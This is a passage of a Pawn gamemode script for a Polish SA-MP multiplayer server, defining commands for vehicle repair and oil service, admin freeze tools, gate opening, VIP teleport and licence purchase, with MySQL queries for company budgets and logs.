			return BrakAdmina(playerid,6);

		if(FreeVIP == true)
		{
			FreeVIP = false;
			SendClientMessage(playerid,Czerwony,"# Opcja darmowego vipa zostala wylaczona!");
		}
		else
		{
			FreeVIP = true;
			SendClientMessage(playerid,Zielony,"# Opcja darmowego vipa zostala wlaczona!");
		}

		return 1;
	}
	CMD:serwis(playerid, params[])
    {
    new vehid = GetPlayerVehicleID(playerid);

	if(vehid == 0)
		return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

    for(new ps; ps < sizeof(PunktySerwis); ps++)
	{
	if(IsPlayerInRangeOfPoint(playerid, 5.0, PunktySerwis[ps][0], PunktySerwis[ps][1], PunktySerwis[ps][2]))
	{
						
		if(GetMoneyEx(playerid) < 200)
		    return SendClientMessage(playerid, Czerwony, "Aby naprawic pojazd potrzebujesz "BIALYHEX"$200"CZERWONYHEX"!");

		if(GetPlayerState(playerid) != 2)
		    return SendClientMessage(playerid, Czerwony, "Musisz byc kierowca!");

		SetTimerEx("serwistimer",SERWIS_TIME*1000,false,"i",playerid);
		TogglePlayerControllable(playerid, 0);
		
		TextDrawShowForPlayer(playerid,serwisusebox);
		TextDrawShowForPlayer(playerid,serwistd);

		new query[200];
		format(query,sizeof query,"UPDATE `company` SET `budget` = `budget` + '200' WHERE `id` = '2'");
		mysql_query(query);


		format(query,sizeof query,"INSERT INTO `earnedinfo`(`uid`, `company`, `text`, `count`) VALUES ('%d','2','%s skorzystal z serwisu','200')",PlayerInfo[playerid][UID],PlayerName(playerid));
		mysql_query(query);


	}
	else
	{
		SendClientMessage(playerid, Czerwony, "Nie jestes w serwisie!");
	}
	}
	return 1;
}	

	CMD:serwis_olej(playerid, params[])
    {
    new vehid = GetPlayerVehicleID(playerid);

	if(vehid == 0)
		return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

    for(new ps; ps < sizeof(PunktySerwis); ps++)
	{
	if(IsPlayerInRangeOfPoint(playerid, 5.0, PunktySerwis[ps][0], PunktySerwis[ps][1], PunktySerwis[ps][2]))
	{
						
		if(GetMoneyEx(playerid) < 200)
		    return SendClientMessage(playerid, Czerwony, "Aby uzupelnic olej potrzebujesz "BIALYHEX"$2500"CZERWONYHEX"!");

		if(GetPlayerState(playerid) != 2)
		    return SendClientMessage(playerid, Czerwony, "Musisz byc kierowca!");

		SetTimerEx("serwistimer2",SERWIS_TIME*1000,false,"i",playerid);
		TogglePlayerControllable(playerid, 0);
		
		TextDrawShowForPlayer(playerid,serwisusebox);
		TextDrawShowForPlayer(playerid,serwistd);

		new query[200];
		format(query,sizeof query,"UPDATE `company` SET `budget` = `budget` + '2500' WHERE `id` = '2'");
		mysql_query(query);


		format(query,sizeof query,"INSERT INTO `earnedinfo`(`uid`, `company`, `text`, `count`) VALUES ('%d','2','%s skorzystal z serwisu','2500')",PlayerInfo[playerid][UID],PlayerName(playerid));
		mysql_query(query);


	}
	else
	{
		SendClientMessage(playerid, Czerwony, "Nie jestes w serwisie!");
	}
	}
	return 1;
}	

forward serwistimer2(playerid);
public serwistimer2(playerid)
{
	new vehid = GetPlayerVehicleID(playerid);
	SetVehicleHealth(vehid,1000);
	VehicleInfo[vehid][Olej] = 10;
	GivePlayerMoney(playerid, -2500);
	SendClientMessage(playerid, Zielony, "Wymieniles olej w swoim pojezdzie!");

	TextDrawHideForPlayer(playerid,serwistd);
	TextDrawHideForPlayer(playerid,serwisusebox);


	return TogglePlayerControllable(playerid, 1);
}


forward serwistimer(playerid);
public serwistimer(playerid)
{
	new vehid = GetPlayerVehicleID(playerid);
	SetVehicleHealth(vehid,1000);
	RepairVehicle(vehid);
	GivePlayerMoney(playerid, -200);
	SendClientMessage(playerid, Zielony, "Naprawiles swój pojazd!");

	TextDrawHideForPlayer(playerid,serwistd);
	TextDrawHideForPlayer(playerid,serwisusebox);


	return TogglePlayerControllable(playerid, 1);
}

CMD:suszarka(playerid,params[])
{
	if(PlayerInfo[playerid][Team] != COMPANY_POLICJA)
	return BrakTeam(playerid,COMPANY_POLICJA);

	if(GetPVarInt(playerid,"suszarka") == 0)
	{
	TimerSuszarka[playerid] = SetTimerEx("SuszarkaCheck",400,true,"i",playerid);
	TextDrawShowForPlayer(playerid,SuszarkaInfo[playerid]);
	TextDrawShowForPlayer(playerid,SuszarkaSpeed[playerid]);
	TextDrawShowForPlayer(playerid,SuszarkaVeh[playerid]);
	TextDrawShowForPlayer(playerid,SuszarkaPlayer[playerid]);
	SendClientMessage(playerid,Zielony,"# Suszarka: "BIALYHEX"Wlaczona!");
	SetPVarInt(playerid,"suszarka",1);
	}
	else
	{
	KillTimer(TimerSuszarka[playerid]);
	TextDrawHideForPlayer(playerid,SuszarkaInfo[playerid]);
	TextDrawHideForPlayer(playerid,SuszarkaSpeed[playerid]);
	TextDrawHideForPlayer(playerid,SuszarkaVeh[playerid]);
	TextDrawHideForPlayer(playerid,SuszarkaPlayer[playerid]);
	SendClientMessage(playerid,Zielony,"# Suszarka: "CZERWONYHEX"Wylaczona"ZIELONYHEX"!");
	SetPVarInt(playerid,"suszarka",0);
	}

	return 1;
}
CMD:freeze(playerid,params[])
{
	if(PlayerInfo[playerid][LevelAdmin] <= 1)
	return BrakAdmina(playerid,2);

	new id;
	if(sscanf(params,"d",id))
		return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/freeze [id]");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");


	TogglePlayerControllable(id, 0);
	SendClientMessage(playerid,Zielony,"# Zamroziles gracza!");

	return 1;
}
CMD:un_freeze(playerid,params[])
{
	if(PlayerInfo[playerid][LevelAdmin] <= 1) // by kapiziak kapiza2 itd.
	return BrakAdmina(playerid,2);

	new id;
	if(sscanf(params,"d",id))
		return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/freeze [id]");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");


	TogglePlayerControllable(id, 1);
	SendClientMessage(playerid,Zielony,"# Odmroziles gracza!");

	return 1;
}
CMD:active_antycheat_veh(playerid,params[])
{
	if(PlayerInfo[playerid][LevelAdmin] <= 5)
		return BrakAdmina(playerid,6);

	if(antycheatveh == true)
	{
		antycheatveh = false;
		SendClientMessage(playerid,Czerwony,"# AntyCheatVehicle: OFF");
	}
	else
	{
		antycheatveh = true;
		SendClientMessage(playerid,Zielony,"# AntyCheatVehicle: ON!");
	}

	return 1;
}
CMD:car_jump(playerid,params[])
{

	if(PlayerInfo[playerid][LevelAdmin] <= 3)
	return BrakAdmina(playerid,4);

	new Float:zplus;
	if(sscanf(params,"f",zplus))
		return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/car_jump [z+]");



	new Float:vX,Float:vY,Float:vZ;
	GetVehiclePos(GetPlayerVehicleID(playerid),vX,vY,vZ);
	SetVehiclePos(GetPlayerVehicleID(playerid),vX,vY,vZ+zplus);




	return 1;
}
CMD:td_off(playerid,params[])
{
	TextDrawHideForPlayer(playerid,pasekuser[playerid]);
	TextDrawHideForPlayer(playerid,useboxuser[playerid]);
	TextDrawHideForPlayer(playerid,useboxp);
	TextDrawHideForPlayer(playerid,useboxp2);
	return 1;
}
CMD:td_on(playerid,params[])
{
	TextDrawShowForPlayer(playerid,useboxp);
	TextDrawShowForPlayer(playerid,useboxp2);
	TextDrawShowForPlayer(playerid,pasekuser[playerid]);
	TextDrawShowForPlayer(playerid,useboxuser[playerid]);


	return 1;
}
CMD:car_info(playerid,params[])
{
	if(PlayerInfo[playerid][LevelAdmin] <= 2)
	return BrakAdmina(playerid,3);


	new vUid;
	if(sscanf(params,"d",vUid))
	return SendClientMessage(playerid, Zielony, "# Uzyj: "BIALYHEX"/car_info [uid]");

	new vDLL;

	for(new i=0; i < LoadedInfo[Vehicles]; i++)
	{
		if(VehicleInfo[i][UID] == vUid)
		{
			vDLL = i;
			i = LoadedInfo[Vehicles];
		}
	}

	new string[150];
	format(string,sizeof string,"# VEH: [Model] %d [Owner] %s [DLL] %d [UID] %d",VehicleInfo[vDLL][Model],VehicleInfo[vDLL][Owner],vDLL,vUid);
	SendClientMessage(playerid,JasnyNiebieski,string);




	return 1;
}
CMD:rampa(playerid,params[])
{
	new vehicleid = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(vehicleid) == 578) // If it's a DFT-30
	{
		if(!opendoor[vehicleid])
		{
			DestroyObject(objveh[vehicleid][4]);
			objveh[vehicleid][5] = CreateObject(11474, 0, 0, 0, 0, 0, 0);
			objveh[vehicleid][6] = CreateObject(11474, 0, 0, 0, 0, 0, 0);
			AttachObjectToVehicle(objveh[vehicleid][5], vehicleid, -0.025000000372529, -6.1770000457764, -0.80699998140335, 58.193572998047, 194.33984375, 166.49182128906);
			AttachObjectToVehicle(objveh[vehicleid][6], vehicleid, 0.037999998778105, -7.3889999389648, -1.5329999923706, 58.189086914063, 194.33715820313, 166.48681640625);
			opendoor[vehicleid]=true;
			//return 1;
		}
		else
		{
		    DestroyObject(objveh[vehicleid][5]);
		    DestroyObject(objveh[vehicleid][6]);
		    objveh[vehicleid][4] = CreateObject(11474, -0.068000003695488, -5.7540001869202, 0.38100001215935, 0, 2.5, 5.5); // elevator
		    AttachObjectToVehicle(objveh[vehicleid][4], vehicleid, -0.068000003695488, -5.7540001869202, 0.38100001215935, 0, 2.5, 5.5);
		    opendoor[vehicleid]=false;
		}
	}


   	return 1;
}
CMD:pasy(playerid,params[])
{
	if(!IsPlayerInAnyVehicle(playerid))
	return SendClientMessage(playerid, Czerwony, "# Musisz siedziec w jakims pojezdzie!");

	if(PlayerInfo[playerid][Pasy] == false)
	{
		PlayerInfo[playerid][Pasy] = true;
		SendClientMessage(playerid, Zielony, "# Zapiales pasy!");
	}
	else if(PlayerInfo[playerid][Pasy] == true)
	{
		PlayerInfo[playerid][Pasy] = false;
		SendClientMessage(playerid, Zielony, "# Odpiales pasy!");
	}


	return 1;
}
CMD:wymien_olej(playerid,params[])
{
	if(PlayerInfo[playerid][Team] != COMPANY_PD)
		return BrakTeam(playerid,COMPANY_PD);

	new vehid = GetPlayerVehicleID(playerid);

	if(vehid == 0)
		return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

	if(VehicleInfo[vehid][Olej] > 5)
		return SendClientMessage(playerid, Szary, "# Poziom oleju w pojezdzie moze wynosic co najmiej 5!");


	if(!IsPlayerInRangeOfPoint(playerid, OLEJ_RANGE,OLEJ_X,OLEJ_Y,OLEJ_Z))
		return SendClientMessage(playerid, Szary, "# Musisz byc w bazie!");


	if(BonusCargo == true)
	{
	SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
	GiveMoneyEx(playerid,HW_MONEY);
	GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
	Earned(playerid,HW_MONEY,"Bonus HW olej");
	}

	SendClientMessage(playerid,Zielony,"# Poziom oleju zostal podwyzszony!");
	if(PlayerInfo[playerid][VIP] == 1)
	{
		SendClientMessage(playerid,Zolty,"Bonus: "BIALYHEX"$700 "ZIELONYHEX"i"BIALYHEX" 6 score");
		GiveMoneyEx(playerid,700);
		GiveScoreEx(playerid,GetScoreEx(playerid)+6);
		Earned(playerid,700,"Wymiana oleju, vip");
	}
	if(PlayerInfo[playerid][VIP] == 0)
	{
		SendClientMessage(playerid,Zolty,"Bonus: "BIALYHEX"$450 "ZIELONYHEX"i"BIALYHEX" 4 score");
		GiveMoneyEx(playerid,450);
		GiveScoreEx(playerid,GetScoreEx(playerid)+4);
		Earned(playerid,450,"Wymiana oleju, bez vip");
	}


	VehicleInfo[vehid][Olej] = 10;

	return 1;
}
CMD:car_price_all(playerid,params[])
{
	if(PlayerInfo[playerid][LevelAdmin] <= 4)
		return BrakAdmina(playerid,5);

	new priceing,type;

	if(sscanf(params, "dd", type,priceing))
		return SendClientMessage(playerid, JasnyCzerwony, "/car_price_all [type] [ CENA POJAZDU ]");

	//new vehicleidd = GetPlayerVehicleID(playerid);


	if(priceing < 0)
	{
		return SendClientMessage(playerid, JasnyCzerwony, "Zla wartosc PRICE!");
	}

	if(type < 400 || type > 611)
	{
		return SendClientMessage(playerid, JasnyCzerwony, "# Zla wartosc type!");
	}

	new buffer[300];

	for(new v=0; v < LoadedInfo[Vehicles]; v++)
	{
		if(GetVehicleModel(v) == type)
		{
		format(buffer,sizeof buffer,"UPDATE `vehicles` SET `Rynkowa`='%d' WHERE id='%d'",priceing,VehicleInfo[v][UID]);
		mysql_query(buffer);
		//printf("[ADMIN LOG] %s ustawil wartosc price u auta %d na : %d",Player(playerid),VehicleInfo[vehicleidd][UID],priceing);
		
		VehicleInfo[v][Price] = priceing;

		if(VehicleInfo[v][sell] == 1)
		{
			Delete3DTextLabel(sell3d[v]);
			new string[150];
			format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[v][Price]);
			sell3d[v] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
			Attach3DTextLabelToVehicle(sell3d[v], v, 0.0, 0.0, 0.0);
		}

		}

	}

	SendClientMessage(playerid,Zielony,"# Ceny zostaly poprawnie zmienione!");

	format(logstring,sizeof logstring,"Zmienil ceny rynkowe type %s(%d) na $%d",VehName[type-400], type,priceing);
	AddLog(PlayerName(playerid),logstring);
	return 1;
}
CMD:autologin(playerid,params[])
{
	new Query[80];
	new alog;
	format(Query,sizeof(Query),"SELECT `autologin` FROM `users` WHERE `id` = '%d' LIMIT 1;",PlayerInfo[playerid][UID]);
	mysql_query(Query);
	mysql_store_result();
	if(mysql_num_rows() != 0)
	{
		mysql_fetch_row(Query,"|");

		
		sscanf(Query,"p<|>d",alog);

	}
	mysql_free_result();


	if(alog == 1) 
	{
		format(Query,sizeof(Query),"UPDATE `users` SET `autologin` = '0' WHERE `id` = '%d' LIMIT 1;",PlayerInfo[playerid][UID]);
		SendClientMessage(playerid,Zielony,"# Funkcja automatycznego logowania z IP zostala wylaczona!");
	}
	else
	{
		format(Query,sizeof(Query),"UPDATE `users` SET `autologin` = '1' WHERE `id` = '%d' LIMIT 1;",PlayerInfo[playerid][UID]);
		SendClientMessage(playerid,Zielony,"# Funkcja automatycznego logowania z IP zostala "BIALYHEX"wlaczona"ZIELONYHEX"!");
	}
	mysql_query(Query);

	return 1;
}
forward tpvip(playerid);
public tpvip(playerid)
{

	SetPlayerPos(playerid,2167.3186, 977.8549, 10.8706+1);
	SendClientMessage(playerid, Zielony, "# Zostales teleportowany do bazy vip!");
	return 1;
}
CMD:tp_vip(playerid,params[])
{
	//2167.3186, 977.8549, 10.8706

	if(PlayerInfo[playerid][VIP] == 0)
		return SendClientMessage(playerid,Szary,"# Nie posiadasz konta premium!");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid,Szary,"# Nie mozesz byc w pojezdzie!");

	SendClientMessage(playerid, Zielony, "# Za 5 sekund zostaniesz teleportowany do bazy VIP!");
	SetTimerEx("tpvip",5*1000,false,"i",playerid);

	return 1;
}


/*
		BramaMango1 = CreateObject(980,664.9000200,-1308.8000000,15.2000000,0.0000000,0.0000000,0.0000000); //bra_close
		BramaMango2 = CreateObject(980,660.4000200,-1227.6000000,17.6000000,0.0000000,0.0000000,60.0000000); //bra_close
		BramaMango3 = CreateObject(980,784.7999900,-1152.5000000,25.3000000,0.0000000,0.0000000,92.0000000); //bra_close

*/

forward bramaclosem1();
forward bramaclosem2();
forward bramaclosem3();
forward bramacloseDziadu();


public bramaclosem1()
{
	return MoveObject(BramaMango1,664.9000200,-1308.8000000,15.2000000,1.0);
}
public bramaclosem2()
{
	return MoveObject(BramaMango2,660.4000200,-1227.6000000,17.6000000,1.0);
	
}
public bramaclosem3()
{
	return MoveObject(BramaMango3,784.7999900,-1152.5000000,25.3000000,1.0);
}
public bramacloseDziadu()
{
	return MoveObject(bramaDziadu,263.132232,-1333.603515,54.035530,1.0);
}


CMD:bm_1(playerid,params[])
{
	MoveObject(BramaMango1,664.9000200,-1308.8000000,5.2000000,4);
	SetTimer("bramaclosem1",5000,false);
	SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

	return 1;
}
CMD:bm_2(playerid,params[])
{
	MoveObject(BramaMango2,660.4000200,-1227.6000000,0.60000004,4);
	SetTimer("bramaclosem2",5000,false);
	SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

	return 1;
}
CMD:bm_3(playerid,params[])
{
	MoveObject(BramaMango3,784.7999900,-1152.5000000,10.3000000,4);
	SetTimer("bramaclosem3",5000,false);
	SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

	return 1;
}

// ...........................................................................................................

CMD:meroleg(playerid,params[])
{
	MoveObject(bramaDziadu,263.132232,-1333.603515,30.035530,4);
	SetTimer("bramacloseDziadu",5000,false);
	SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

	return 1;
}
CMD:dodaj_zlecenie(playerid,params[])
{


	if(PlayerInfo[playerid][LevelAdmin] <= 5)
		return BrakAdmina(playerid,6);




	new t,cid,kct;
	if(sscanf(params,"ddd",t,cid,kct))
	return 0;

	/*if(!strcmp(PlayerName(playerid),"MangoPL",false)))
	{
		format(logstring,sizeof logstring,"Proba manga dodania KM %d & zlecenie towar %d ",kct,cid);
		AddLog(PlayerName(playerid),logstring);
	}
*/
	VehicleInfo[t][Towar] = cid;
	VehicleInfo[t][KM] = kct;
	VehicleInfo[t][ToOrder] = 2;


	format(logstring,sizeof logstring,"Dodaje KM %d & zlecenie towar %d ",kct,cid);
	AddLog(PlayerName(playerid),logstring);

	return 1;
}
forward bramacloseprzedek();
public bramacloseprzedek()
{
	return MoveObject(BramaPrzedek,-504.7999900,2592.7000000,55.2000000,1.0);
}
CMD:przedzio69(playerid,params[])
{
	// BramaPrzedek = CreateObject(980,-504.7999900,2592.7000000,55.2000000,0.0000000,0.0000000,270.0000000);
	MoveObject(BramaPrzedek,-504.7999900,2592.7000000,20.2000000,4);
	SetTimer("bramacloseprzedek",5000,false);
	SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

	return 1;
}
CMD:kup_prawko(playerid,params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, PRAWKO_RANGE, PRAWKO_X, PRAWKO_Y, PRAWKO_Z))
	return SendClientMessage(playerid, Szary, "# Musisz byc w odpowiednim miejscu!");

	ShowPlayerDialog(playerid, PRAWKO_DIALOG, DIALOG_STYLE_LIST, ">> Prawo Jazdy <<", "Kategoria: A >> $2000\nKategoria: B >> $2500\nKategoria: C >> $3000\nKategoria: D >> $2700\nPrawo jazdy jest wazne przez 14 dni...\nNa poczatku testu zostana Ci pobrane pieniadze...\njezeli sie pomylisz nie ma zwrotu!", "Kup", "Anuluj");
	return 1;
}



// BramaPrzedek = CreateObject(969,-1413.5000000,-971.5999800,199.0000000,0.0000000,0.0000000,75.2500000);




	/*CMD:polna12(playerid,params[])
	{
		MoveObject(bramacruzz,1012.9000000,-639.4000200,122.7000000,4);
		SetTimer("bramaclosecruzz",5000,false);
		SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

		return 1;
	}

	forward bramaclosecruzz();
	public bramaclosecruzz()
	{
		return MoveObject(bramacruzz, 1002.5000000,-644.0999800,122.7000000,1.0);
	}
	*/
	// Copyright (c) 2014-2015 KapiziaK